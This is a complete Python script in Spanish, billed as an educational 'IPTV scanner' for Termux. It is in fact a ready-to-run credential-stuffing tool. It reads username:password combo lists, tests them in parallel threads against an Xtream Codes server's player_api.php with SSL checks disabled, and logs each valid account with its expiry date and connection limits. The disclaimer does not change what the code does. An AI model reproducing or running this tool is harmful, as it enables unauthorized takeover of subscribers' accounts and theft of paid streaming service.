#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Escáner de IPTV para Termux - Estilo Juan
Uso educativo únicamente en redes propias o con autorización.
"""

import requests
import json
import time
import threading
import queue
import os
import sys
from datetime import datetime

# Deshabilitar advertencias de SSL (para evitar ruido)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Banner con nombre "Juan"
BANNER = """
╔══════════════════════════════════════════╗
║      🐉  JUAN IPTV SCANNER  🐉          ║
║        Solo para fines educativos         ║
╚══════════════════════════════════════════╝
"""

def limpiar_pantalla():
    """Limpia la pantalla según el sistema operativo."""
    os.system('clear' if os.name == 'posix' else 'cls')

def mostrar_banner():
    """Muestra el banner principal."""
    print(BANNER)
    print("  [!] Uso responsable. No atacar servidores ajenos.\n")

def cargar_combos(ruta_archivo):
    """Carga combos desde archivo (formato usuario:contraseña)."""
    combos = []
    try:
        with open(ruta_archivo, 'r', encoding='utf-8', errors='ignore') as f:
            for linea in f:
                linea = linea.strip()
                if ':' in linea:
                    user, pwd = linea.split(':', 1)
                    combos.append((user, pwd))
    except FileNotFoundError:
        print(f" [!] Error: No se encuentra el archivo '{ruta_archivo}'")
        sys.exit(1)
    return combos

def probar_combo(server, user, pwd, timeout=10):
    """
    Prueba un combo contra el servidor Xtream Codes.
    Retorna (bool, dict_info) donde bool indica si es hit.
    """
    url = f"{server}/player_api.php?username={user}&password={pwd}"
    try:
        resp = requests.get(url, timeout=timeout, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            # Si es un diccionario con user_info, es válido
            if isinstance(data, dict) and data.get('user_info'):
                return True, data
    except:
        pass
    return False, None

def guardar_hit(server, user, pwd, info, archivo_salida):
    """Guarda un hit encontrado en el archivo de resultados."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exp_date = info.get('user_info', {}).get('exp_date', 'N/A')
    if exp_date and exp_date != 'N/A':
        try:
            exp_date = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d')
        except:
            pass
    active_cons = info.get('user_info', {}).get('active_cons', 'N/A')
    max_cons = info.get('user_info', {}).get('max_connections', 'N/A')
    
    with open(archivo_salida, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {user}:{pwd}\n")
        f.write(f"  Servidor: {server}\n")
        f.write(f"  Expira: {exp_date} | Activas: {active_cons} | Max: {max_cons}\n")
        f.write("-" * 50 + "\n")

def trabajador(server, combo_queue, resultados, hits, lock, archivo_salida, estado):
    """
    Función ejecutada por cada hilo.
    Toma combos de la cola y los prueba.
    """
    while True:
        try:
            idx, user, pwd = combo_queue.get(timeout=1)
        except queue.Empty:
            break
        
        # Actualizar estado del combo actual
        with lock:
            estado['actual'] = f"{user}:{pwd}"
        
        # Probar
        es_hit, info = probar_combo(server, user, pwd)
        
        if es_hit:
            with lock:
                hits[0] += 1
                resultados.append((user, pwd, info))
                guardar_hit(server, user, pwd, info, archivo_salida)
                # Mostrar hit inmediatamente en pantalla (línea aparte)
                print(f"\n[+] HIT #{hits[0]}: {user}:{pwd}  [Expira: {info.get('user_info',{}).get('exp_date','N/A')}]")
        
        combo_queue.task_done()
        
        # Pequeña pausa para no saturar
        time.sleep(0.05)

def mostrar_estado(estado, hits, total, iniciado):
    """Muestra la línea de estado actual (se actualiza dinámicamente)."""
    procesados = estado['procesados']
    porcentaje = (procesados / total) * 100 if total > 0 else 0
    tiempo_trans = time.time() - iniciado
    cps = procesados / tiempo_trans if tiempo_trans > 0 else 0
    linea = (f"\r[*] Progreso: {procesados}/{total} combos ({porcentaje:.1f}%) | "
             f"Hits: {hits[0]} | Combo actual: {estado['actual']:<30} | "
             f"{cps:.1f} combos/seg   ")
    sys.stdout.write(linea)
    sys.stdout.flush()

def escanear(server, combos, num_hilos=10):
    """
    Función principal de escaneo.
    """
    total = len(combos)
    combo_queue = queue.Queue()
    for i, (user, pwd) in enumerate(combos):
        combo_queue.put((i+1, user, pwd))
    
    resultados = []
    hits = [0]
    lock = threading.Lock()
    estado = {'actual': 'Iniciando...', 'procesados': 0}
    archivo_salida = f"hits_{server.replace('http://','').replace('https://','').replace(':','_')}.txt"
    
    # Hilos
    hilos = []
    for _ in range(num_hilos):
        t = threading.Thread(target=trabajador, args=(server, combo_queue, resultados, hits, lock, archivo_salida, estado))
        t.daemon = True
        t.start()
        hilos.append(t)
    
    # Monitor de progreso
    inicio = time.time()
    while any(t.is_alive() for t in hilos):
        with lock:
            procesados = total - combo_queue.qsize()
            estado['procesados'] = procesados
        mostrar_estado(estado, hits, total, inicio)
        time.sleep(0.5)
    
    # Mostrar final
    mostrar_estado(estado, hits, total, inicio)
    print("\n\n" + "="*60)
    print(f" ✓ Escaneo completado. Hits encontrados: {hits[0]}")
    if hits[0] > 0:
        print(f" ✓ Resultados guardados en: {archivo_salida}")
    print("="*60)

def main():
    limpiar_pantalla()
    mostrar_banner()
    
    # Entrada de datos
    servidor = input(" 🌐 Ingresa la URL del servidor IPTV (ej: http://ejemplo.com:8080): ").strip()
    if not servidor.startswith("http"):
        servidor = "http://" + servidor
    # Eliminar barra final si existe
    servidor = servidor.rstrip('/')
    
    ruta_combo = input(" 📂 Ruta del archivo de combos (ej: /sdcard/combo/mis_combos.txt): ").strip()
    if not os.path.exists(ruta_combo):
        print(f" [!] El archivo '{ruta_combo}' no existe. Saliendo.")
        sys.exit(1)
    
    try:
        num_hilos = int(input(" ⚙️  Número de hilos (recomendado 10-20): ") or "10")
    except:
        num_hilos = 10
    
    print("\n[*] Cargando combos...")
    combos = cargar_combos(ruta_combo)
    if not combos:
        print(" [!] No se encontraron combos válidos en el archivo.")
        sys.exit(1)
    
    print(f"[*] Total de combos a probar: {len(combos)}")
    print(f"[*] Usando {num_hilos} hilos. Presiona Ctrl+C para detener.\n")
    time.sleep(2)
    
    try:
        escanear(servidor, combos, num_hilos)
    except KeyboardInterrupt:
        print("\n\n [!] Escaneo interrumpido por el usuario.")
        sys.exit(0)

if __name__ == "__main__":
    main()